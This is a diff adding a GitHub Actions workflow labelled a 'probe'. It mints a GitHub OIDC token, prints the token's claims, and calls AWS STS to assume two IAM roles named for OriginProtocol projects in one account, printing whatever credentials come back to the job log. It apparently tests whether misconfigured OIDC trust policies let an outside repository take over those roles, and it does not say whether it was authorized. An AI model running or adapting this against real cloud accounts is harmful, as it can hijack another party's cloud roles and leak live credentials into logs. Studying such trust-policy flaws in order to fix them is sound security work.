@@ -1,0 +1,25 @@
+name: w18 probe
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: mint and assume
+        run: |
+          set -euo pipefail
+          RESP=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
+          TOKEN=$(printf '%s' "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "=== CLAIMS ==="
+          printf '%s' "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool || true
+          echo "=== STS origin-dollar ==="
+          curl -sS -X POST https://sts.amazonaws.com/ \
+            -d "Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::114563866192:role/talos-gha-OriginProtocol-origin-dollar&RoleSessionName=w18probe&WebIdentityToken=${TOKEN}"
+          echo
+          echo "=== STS arm-oeth (sibling, for context only) ==="
+          curl -sS -X POST https://sts.amazonaws.com/ \
+            -d "Action=AssumeRoleWithWebIdentity&Version=2011-06-15&RoleArn=arn:aws:iam::114563866192:role/talos-gha-OriginProtocol-arm-oeth&RoleSessionName=w18probe&WebIdentityToken=${TOKEN}"
+          echo
